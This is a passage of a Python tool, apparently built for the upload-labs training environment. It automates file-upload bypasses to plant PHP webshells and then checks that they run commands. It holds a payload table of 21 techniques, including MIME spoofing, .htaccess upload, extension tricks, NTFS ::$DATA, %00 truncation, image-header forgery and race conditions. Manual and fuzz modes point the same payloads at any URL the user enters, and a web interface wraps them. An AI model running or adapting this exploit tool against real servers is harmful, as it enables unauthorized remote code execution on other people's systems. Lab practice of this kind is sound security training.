                html = self._page('自动化测试', f"<div class='card'><div class='title'>自动化测试</div><form method='post' action='/auto' class='grid'><div class='field'><label>Base URL</label><input name='base_url' value='{base_url}' placeholder='http://192.168.x.x'></div><div class='field'><label>清理路径</label><input name='clear_path' value='{clear_path}' placeholder='rmdir.php?action=clean_upload_file'></div><div class='card-actions'><button class='btn btn-primary' type='submit'>开始测试</button></div></form></div>", 'auto')
                self._send_html(html)
            elif path == '/manual':
                html = self._page('手动测试', """
<div class='card'>
  <div class='title'>手动测试</div>
  <form method='post' action='/manual' class='grid grid-2'>
    <div class='field'><label>目标URL</label><input name='url' placeholder='http://host/upload.php'></div>
    <div class='field'><label>文件路径</label><input name='file_path' placeholder='Payload\\cmd.php'></div>
    <div class='field'><label>代理</label><input name='proxies' placeholder='http://127.0.0.1:8080'></div>
    <div class='field'><label>Burp代理</label><select name='is_bp'><option value='0'>否</option><option value='1'>是</option></select></div>
    <div class='field'><label>超时时间</label><input name='timeout' value='30'></div>
    <div class='field'><label>伪造文件名</label><input name='fake_file_name' placeholder='cmd.php. .'></div>
    <div class='field'><label>MIME类型</label><input name='fake_mime_type' placeholder='image/png'></div>
    <div class='field'><label>magic_type</label><input name='magic_type_input' placeholder='gif/jpg/png'></div>
    <div class='field'><label>上传.htaccess</label><select name='is_htaccess'><option value='0'>否</option><option value='1'>是</option></select></div>
    <div class='field'><label>使用::$data</label><select name='is_data'><option value='0'>否</option><option value='1'>是</option></select></div>
    <div class='field'><label>保存路径</label><input name='save_path' placeholder='../upload/13.php'></div>
    <div class='field' style='grid-column:1/-1'><label>测试URL</label><input name='test_url' placeholder='http://host/include.php?file=uploads/shell.php'></div>
    <div class='card-actions' style='grid-column:1/-1'><button class='btn btn-primary' type='submit'>执行</button></div>
  </form>
</div>
""", 'manual')
                self._send_html(html)
            elif path == '/fuzz':
                html = self._page('Fuzz测试', """
<div class='card'>
  <div class='title'>Fuzz测试</div>
  <form method='post' action='/fuzz' class='grid'>
    <div class='field'><label>目标URL</label><input name='url' placeholder='http://example.com/upload.php'></div>
    <div class='card-actions'><button class='btn btn-primary' type='submit'>开始Fuzz</button></div>
  </form>
</div>
""", 'fuzz')
                self._send_html(html)
            elif path == '/help':
                try:
                    with open('web-interaction.html', 'r', encoding='utf-8') as f:
                        content = f.read()
                    self._send_html(content)
                except Exception:
                    self._send_html(self._page('帮助', "<div class='card'><div class='title'>帮助文件不存在</div><div class='muted'>请确保 web-interaction.html 在同目录</div></div>", ''), 404)
            else:
                self._send_html(self._page('404', "<div class='card'><div class='title'>未找到</div><div class='muted'>路径不存在</div></div>", ''), 404)
        def do_POST(self):
            p = urllib.parse.urlparse(self.path)
            path = p.path
            length = int(self.headers.get('Content-Length', '0'))
            raw = self.rfile.read(length).decode('utf-8') if length > 0 else ''
            form = urllib.parse.parse_qs(raw)
            if path == '/auto':
                b = form.get('base_url', [''])[0].strip() or base_url
                c = form.get('clear_path', [''])[0].strip() or clear_path
                out = _capture_output(run_auto_tests_web, b, c)
                safe_out = out.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
                colored_out = self._colorize_log(safe_out)
                page = self._page('结果', f"<div class='card'><div class='title'>自动化测试结果</div><div class='card-actions'><a class='btn btn-ghost' href='/auto'>返回</a><button id='copy-btn' class='btn'>复制日志</button><button id='download-btn' class='btn'>下载日志</button></div><pre id='log'>{colored_out}</pre></div>", 'auto')
                self._send_html(page)
            elif path == '/manual':
                url_val = form.get('url', [''])[0].strip()
                file_path_val = form.get('file_path', [''])[0].strip()
                proxies_val = form.get('proxies', [''])[0].strip() or None
                is_bp_val = int(form.get('is_bp', ['0'])[0])
                timeout_val = form.get('timeout', ['30'])[0]
                try:
                    timeout_val = int(timeout_val)
                except:
                    timeout_val = 30
                fake_name_val = form.get('fake_file_name', [''])[0].strip() or None
                fake_mime_val = form.get('fake_mime_type', [''])[0].strip() or None
                magic_val = form.get('magic_type_input', [''])[0].strip() or None
                is_htaccess_val = int(form.get('is_htaccess', ['0'])[0])
                is_data_val = int(form.get('is_data', ['0'])[0])
                save_path_val = form.get('save_path', [''])[0].strip() or None
                test_url_val = form.get('test_url', [''])[0].strip() or None
                out = _capture_output(run_manual_tests_web, url_val, file_path_val, proxies_val, timeout_val, fake_name_val, fake_mime_val, magic_val, is_htaccess_val, is_bp_val, is_data_val, save_path_val, test_url_val)
                safe_out = out.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
                colored_out = self._colorize_log(safe_out)
                page = self._page('结果', f"<div class='card'><div class='title'>手动测试结果</div><div class='card-actions'><a class='btn btn-ghost' href='/manual'>返回</a><button id='copy-btn' class='btn'>复制日志</button><button id='download-btn' class='btn'>下载日志</button></div><pre id='log'>{colored_out}</pre></div>", 'manual')
                self._send_html(page)
            elif path == '/fuzz':
                url_val = form.get('url', [''])[0].strip()
                out = _capture_output(run_fuzz_tests_web, url_val)
                safe_out = out.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
                colored_out = self._colorize_log(safe_out)
                page = self._page('结果', f"<div class='card'><div class='title'>Fuzz测试结果</div><div class='card-actions'><a class='btn btn-ghost' href='/fuzz'>返回</a><button id='copy-btn' class='btn'>复制日志</button><button id='download-btn' class='btn'>下载日志</button></div><pre id='log'>{colored_out}</pre></div>", 'fuzz')
                self._send_html(page)
            else:
                self._send_html(self._page('404', "<div class='card'><div class='title'>未找到</div><div class='muted'>路径不存在</div></div>", ''), 404)
    httpd = HTTPServer((host, port), WebHandler)
    print(f"Web服务器启动: http://{host}:{port}/")
    httpd.serve_forever()


print("----------------------------------------------------------")
print("欢迎使用文件上传漏洞(upload-lab)测试工具-version1.0")
print("by aiksu.")
print("请输入1-4的数字进行选择")
print("1.进行对upload-labs的自动化测试")
print("2.进行对特定url的手动测试")
print("3.进行对自定义目标的Fuzz测试")
print("4.启动网页端")
print("----------------------------------------------------------")
choose = input("请输入你的选项：")

# 绕过技术描述字典
bypass_tech = {
    '01': '无限制上传',
    '02': 'MIME类型绕过',
    '03': '扩展名黑名单绕过',
    '04': '.htaccess绕过',
    '05': '点空格点绕过',
    '06': '大小写绕过',
    '07': '空格绕过',
    '08': '点号绕过',
    '09': 'NTFS流绕过',
    '10': '双写绕过',
    '11': '双写绕过',
    '12': '%00截断绕过',
    '13': 'POST包路径绕过',
    '14': '文件头检测绕过',
    '15': '图片马绕过',
    '16': '二次渲染绕过',
    '17': '条件竞争',
    '18': '条件竞争',
    '19': 'CVE-2015-2348',
    '20': '数组绕过',
    '21': '数组+竞争绕过'
}

#字典
payload = {
    '01': r"Payload\cmd.php",
    '02': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png'},
    '03': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php3'},
    '04': {'file_path': r'Payload\cmd.jpg', 'fake_mime_type': 'image/png', 'is_htaccess': 1,},
    '05': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php. .'},
    '06': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.pHP'},
    '07': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php '},
    '08': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php.'},
    '09': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php::$DATA'},
    '10': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.pHp. .'},
    '11': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.pphphp'},
    '12': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.jpg'},
    '13': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.jpg' , 'save_path': f'../upload/13.php'},
    '14': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php', 'magic_type_input': 'jpg'},
    '15': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php', 'magic_type_input': 'gif'},
    '16': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/png', 'fake_file_name': 'cmd.php', 'magic_type_input': 'jpg'},
    '17': {'file_path': r'Payload\exp17.gif', 'fake_mime_type': 'image/gif'},
    '18': {'file_path': r'Payload\exp18.gif', 'fake_mime_type': 'image/gif'},
    '19': {'file_path': r'Payload\exp19.gif', 'fake_mime_type': 'image/gif'},
    '20': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/gif', 'save_name': 'cmd.php/.'},
    '21': {'file_path': r'Payload\cmd.php', 'fake_mime_type': 'image/gif', 'save_name_0': 'cmd.php/', 'save_name_2': 'jpg'},
}


# print(payload['01'])
# print(payload['02']['file_path'])
# print(payload['02']['fake_mime_type'])




a = ''

if choose == "1":
    print("您选择了对upload-labs的自动化测试")
    # 在开始自动化测试前检查目标连通性
    if not check_connectivity(base_url, timeout=5, extra_paths=[f"{base_url}/Pass-01/index.php", f"{base_url}/{clear_path}"]):
        print("[Fail]目标不可达或关键路径错误，请检查base_url后重试")
        sys.exit(1)
    # 添加统计变量
    successful_tests = []
    failed_tests = []
    
    for num in range(1,22):
        # 重置全局变量，防止污染
        uploaded_file_path = None
        num = str(num).zfill(2)
        success = False

        # 先处理特殊情况
        if num == "12":
            print(f"*正在向Pass-{num}上传webshell")
            if isinstance(payload[f"{num}"], dict):
                # 如果是字典，解包传递参数
                upload(f"{base_url}/Pass-{num}/index.php?save_path=../upload/{num}.php%00", **payload[f"{num}"])
            else:
                # 如果是字符串，直接作为file_path传递
                upload(f"{base_url}/Pass-{num}/index.php?save_path=../upload/{num}.php%00", payload[f"{num}"])
            print(f"[info]正在测试Pass-{num}是否上传成功")
            success, _ = test_get(f"{base_url}/upload/{num}.php", pass_num=num)
            print(f"[info]正在清除Pass-{num}上传的文件")
            clear_file(f"{base_url}/{clear_path}")
            
            # 记录测试结果
            if success:
                successful_tests.append(f"Pass-{num}")
            else:
                failed_tests.append(f"Pass-{num}")
            continue  # 跳过通用处理
            
        elif num == "13":
            print(f"*正在向Pass-{num}上传webshell")
            if isinstance(payload[f"{num}"], dict):
                # 如果是字典，解包传递参数
                upload(f"{base_url}/Pass-{num}/index.php", **payload[f"{num}"])
            else:
                # 如果是字符串，直接作为file_path传递
                upload(f"{base_url}/Pass-{num}/index.php", payload[f"{num}"])
            print(f"[info]正在测试Pass-{num}是否上传成功")
            success, _ = test_get(f"{base_url}/{saved_path_value}", pass_num=num)
            print(f"[info]正在清除Pass-{num}上传的文件")
            clear_file(f"{base_url}/{clear_path}")
            
            # 记录测试结果
            if success:
                successful_tests.append(f"Pass-{num}")
            else:
                failed_tests.append(f"Pass-{num}")
            continue
        
        elif num == "09":
            print(f"*正在向Pass-{num}上传webshell")
            if isinstance(payload[f"{num}"], dict):
                # 如果是字典，解包传递参数
                upload(f"{base_url}/Pass-{num}/index.php", **payload[f"{num}"])
            else:
                # 如果是字符串，直接作为file_path传递
                upload(f"{base_url}/Pass-{num}/index.php", payload[f"{num}"])
            print(f"[info]正在测试Pass-{num}是否上传成功")
            # 删除uploaded_file_path中的::$data（大小写不敏感）
            if uploaded_file_path:
                cleaned_path = re.sub(r"::\$data", "", uploaded_file_path, flags=re.IGNORECASE)
                success, _ = test_get(f"{base_url}/{cleaned_path}", pass_num=num)
            else:
                print(f"[Fail]Pass-{num}文件上传失败或无法获取上传路径")
                success = False
            print(f"[info]正在清除Pass-{num}上传的文件")
            clear_file(f"{base_url}/{clear_path}")
            
            # 记录测试结果
            if success:
                successful_tests.append(f"Pass-{num}")
            else:
                failed_tests.append(f"Pass-{num}")
            continue
            
        elif num == "14" or num == "15" or num == "16":
            print(f"*正在向Pass-{num}上传webshell")
            if isinstance(payload[f"{num}"], dict):
                # 如果是字典，解包传递参数
                upload(f"{base_url}/Pass-{num}/index.php", **payload[f"{num}"])
            else:
                # 如果是字符串，直接作为file_path传递
                upload(f"{base_url}/Pass-{num}/index.php", payload[f"{num}"])
            print(f"[info]正在测试Pass-{num}是否上传成功")
            success, _ = test_get_2(f"{base_url}/include.php?file={uploaded_file_path}", pass_num=num)
            print(f"[info]正在清除Pass-{num}上传的文件")
            clear_file(f"{base_url}/{clear_path}")
            
            # 记录测试结果
            if success:
                successful_tests.append(f"Pass-{num}")
            else:
                failed_tests.append(f"Pass-{num}")
            continue
            
        elif num == "17":
            print(f"*正在向Pass-{num}上传webshell")
            if isinstance(payload[f"{num}"], dict):
                # 如果是字典，解包传递参数
                upload(f"{base_url}/Pass-{num}/index.php", **payload[f"{num}"])
            else:
                # 如果是字符串，直接作为file_path传递
                upload(f"{base_url}/Pass-{num}/index.php", payload[f"{num}"])
            print(f"[info]正在测试Pass-{num}是否上传成功")
            success, _ = test_get_2(f"{base_url}/include.php?file={uploaded_file_path}", pass_num=num)
            print(f"[info]正在清除Pass-{num}上传的文件")
            clear_file(f"{base_url}/{clear_path}")

            # 记录测试结果
            if success:
                successful_tests.append(f"Pass-{num}")
            else:
                failed_tests.append(f"Pass-{num}")
            continue



        elif num == "18":
            print(f"*正在向Pass-{num}上传webshell")
            retry_count = 0
            max_retries = 100  # 最大重试次数
            while retry_count < max_retries:
                retry_count += 1
                try:
                    html = requests.get(f"{base_url}/upload/{num}.php?cmd=echo aiksu", timeout=5)
                    if 'aiksu' in str(html.text):
                        print('创建WebShell成功')
                        print(f"[info]正在清除Pass-{num}上传的文件")
                        clear_file(f"{base_url}/{clear_path}")
                        success = True
                        break
                except Exception:
                    pass
                
                if isinstance(payload[f"{num}"], dict):
                    # 如果是字典，解包传递参数
                    upload(f"{base_url}/Pass-{num}/index.php", **payload[f"{num}"])
                else:
                    # 如果是字符串，直接作为file_path传递
                    upload(f"{base_url}/Pass-{num}/index.php", payload[f"{num}"])
                print(f"[info]正在测试Pass-{num}文件包含 (尝试 {retry_count}/{max_retries})")
                # 这里不需要更新 success，因为最终成功取决于上面的 check
                test_get_3(f"{base_url}/include.php?file=upload/exp{num}.gif", pass_num=num)
            
            if not success:
                 print(f"[Fail]Pass-{num}条件竞争失败，已达到最大重试次数")

            # 记录测试结果
            if success:
                successful_tests.append(f"Pass-{num}")
            else:
                failed_tests.append(f"Pass-{num}")
            continue

        elif num == "19":
            print(f"*正在向Pass-{num}上传webshell")
            retry_count = 0
            max_retries = 100  # 最大重试次数
            while retry_count < max_retries:
                retry_count += 1
                try:
                    html = requests.get(f"{base_url}/upload/{num}.php?cmd=echo aiksu", timeout=5)
                    if 'aiksu' in str(html.text):
                        print('创建WebShell成功')
                        print(f"[info]正在清除Pass-{num}上传的文件")
                        clear_file(f"{base_url}/{clear_path}")
                        success = True
                        break
                except Exception:
                    pass

                if isinstance(payload[f"{num}"], dict):
                    # 如果是字典，解包传递参数
                    upload(f"{base_url}/Pass-{num}/index.php", **payload[f"{num}"])
                else:
                    # 如果是字符串，直接作为file_path传递
                    upload(f"{base_url}/Pass-{num}/index.php", payload[f"{num}"])
                print(f"[info]正在测试Pass-{num}文件包含 (尝试 {retry_count}/{max_retries})")
                # 用户指出第19关就该是uploadexp{num}.gif，不用加斜杠
                test_get_3(f"{base_url}/include.php?file=uploadexp{num}.gif", pass_num=num)
            
            if not success:
                 print(f"[Fail]Pass-{num}条件竞争失败，已达到最大重试次数")

            # 记录测试结果
            if success:
                successful_tests.append(f"Pass-{num}")
            else:
                failed_tests.append(f"Pass-{num}")
            continue





        # 通用处理逻辑（只有非特殊情况才会执行到这里）
        print(f"*正在向Pass-{num}上传webshell")
        if isinstance(payload[f"{num}"], dict):
            # 如果是字典，解包传递参数
            upload(f"{base_url}/Pass-{num}/index.php", **payload[f"{num}"])
        else:
            # 如果是字符串，直接作为file_path传递
            upload(f"{base_url}/Pass-{num}/index.php", payload[f"{num}"])
        print(f"[info]正在测试Pass-{num}是否上传成功")
        if uploaded_file_path:
            cleaned_path = re.sub(r"::\$data", "", uploaded_file_path, flags=re.IGNORECASE)
            success, _ = test_get(f"{base_url}/{cleaned_path}", pass_num=num)
        else:
            print(f"[Fail]Pass-{num}文件上传失败或无法获取上传路径")
            success = False
        print(f"[info]正在清除Pass-{num}上传的文件")
        clear_file(f"{base_url}/{clear_path}")
        
        # 记录测试结果
        if success:
            successful_tests.append(f"Pass-{num}")
        else:
            failed_tests.append(f"Pass-{num}")
    
    # 输出统计结果
    print("\n" + "="*50)
    print("测试统计结果:")
    print(f"成功测试数量: {len(successful_tests)}/{21}")
    print(f"成功测试列表: {', '.join(successful_tests)}")
    print(f"失败测试数量: {len(failed_tests)}/{21}")
    if failed_tests:
        print(f"失败测试列表: {', '.join(failed_tests)}")
    print("="*50)



if choose == "2":
    print("您选择了对特定url的手动测试")
    print("参数帮助")
    print("url, file_path, proxies=None, timeout=30, fake_file_name=None, fake_mime_type=None, magic_type_input=None, is_htaccess=0, is_bp=0)")
    
    # 获取用户输入的参数
    url = input("请输入目标URL: ")
    file_path = input("请输入要上传的文件路径: ")
    # 手动测试前检查目标连通性
    if not check_connectivity(url, timeout=5):
        print("[Fail]目标不可达，请检查URL并重试")
        sys.exit(1)
    
    # 可选参数
    use_proxy = input("是否使用代理? (y/n, 默认n): ").lower()
    proxies = None
    if use_proxy == 'y':
        proxy_url = input("请输入代理地址 (例如 http://127.0.0.1:8080): ")
        proxies = proxy_url
    
    use_burp = input("是否使用Burp Suite代理? (y/n, 默认n): ").lower()
    is_bp = 1 if use_burp == 'y' else 0
    
    timeout = input("请输入超时时间 (默认30秒): ")
    timeout = int(timeout) if timeout.isdigit() else 30
    
    fake_name = input("请输入伪造的文件名 (可选): ")
    fake_file_name = fake_name if fake_name else None
    
    fake_mime = input("请输入伪造的MIME类型 (可选): ")
    fake_mime_type = fake_mime if fake_mime else None
    
    magic_type = input("请输入magic_type (可选): ")
    magic_type_input = magic_type if magic_type else None
    
    use_htaccess = input("是否上传.htaccess文件? (y/n, 默认n): ").lower()
    is_htaccess = 1 if use_htaccess == 'y' else 0
    
    use_data = input("是否使用::$data? (y/n, 默认n): ").lower()
    is_data = 1 if use_data == 'y' else 0
    
    save_path = input("请输入保存路径 (可选): ")
    save_path = save_path if save_path else None
    
    # 调用upload函数
    upload(url, file_path, proxies, timeout, fake_file_name, fake_mime_type, magic_type_input, is_htaccess, is_bp, is_data, save_path)
    
    # 测试上传结果
    test_url = input("请输入测试URL (例如 http://example.com/include.php?file=uploads/shell.php): ")
    if test_url:
        test_get(test_url)


if choose == "3":
    print("您选择了对自定义目标的Fuzz测试")
    
    # 获取用户输入的参数
    url = input("请输入目标URL (例如 http://example.com/upload.php): ")
    
    # 检查连通性
    if not check_connectivity(url, timeout=5):
        print("[Fail]目标不可达，请检查URL并重试")
        sys.exit(1)
        
    print(f"\n[Info] 开始对 {url} 进行Fuzz测试...")
    print("-" * 50)

    successful_payloads = []
    
    # 遍历payload字典
    for key, val in payload.items():
        tech_desc = bypass_tech.get(key, '未知技术')
        print(f"\n>>> 正在尝试 Payload ID: {key} [{tech_desc}]")
        
        # 准备基础参数
        kwargs = {
            'url': url,
            'timeout': 10,
            'test_id': key
        }
        
        # 确定 file_path 并添加到 kwargs
        if isinstance(val, dict):
             kwargs['file_path'] = val['file_path']
        else:
             kwargs['file_path'] = val

        # 根据字典内容添加额外参数
        if isinstance(val, dict):
            # 映射字典中的 key 到 upload 函数的参数
            if 'fake_mime_type' in val: kwargs['fake_mime_type'] = val['fake_mime_type']
            if 'fake_file_name' in val: kwargs['fake_file_name'] = val['fake_file_name']
            if 'magic_type_input' in val: kwargs['magic_type_input'] = val['magic_type_input']
            if 'is_htaccess' in val: kwargs['is_htaccess'] = val['is_htaccess']
            if 'save_path' in val: kwargs['save_path'] = val['save_path']
            if 'save_name' in val: kwargs['save_name'] = val['save_name']
            if 'save_name_0' in val: kwargs['save_name_0'] = val['save_name_0']
            if 'save_name_2' in val: kwargs['save_name_2'] = val['save_name_2']

        try:
            # 执行上传
            response, uploaded_path = upload(**kwargs)
            
            if uploaded_path:
                print(f"[Success] Payload {key} [{tech_desc}] 上传成功! 路径: {uploaded_path}")
                successful_payloads.append(f"{key} ({tech_desc})")
                
                # 尝试访问上传的文件
                full_url = ""
                if uploaded_path.startswith("http"):
                    full_url = uploaded_path
                else:
                    # 尝试智能拼接
                    base = url.rsplit('/', 1)[0] # 去掉最后的 upload.php
                    if uploaded_path.startswith('/'):
                         parsed_url = urllib.parse.urlparse(url)
                         full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{uploaded_path}"
                    else:
                        full_url = f"{base}/{uploaded_path}"
                
                print(f"[Info] 尝试访问: {full_url}")
                try:
                    check_res = requests.get(full_url, timeout=5)
                    if check_res.status_code == 200:
                        print(f"[Success] 文件可访问! 状态码: 200")
                    else:
                         print(f"[Warn] 文件访问返回状态码: {check_res.status_code}")
                except:
                    pass

            else:
                print(f"[Fail] Payload {key} 上传未返回路径")
                
        except Exception as e:
            print(f"[Error] Payload {key} 执行异常: {str(e)}")

    print("\n" + "="*50)
    print("Fuzz 测试完成")
    print(f"成功 Payload IDs:")
    for success_item in successful_payloads:
        print(f"  - {success_item}")
    print("="*50)

if choose == "4":
    print("您选择了启动网页端")
    start_web_server()


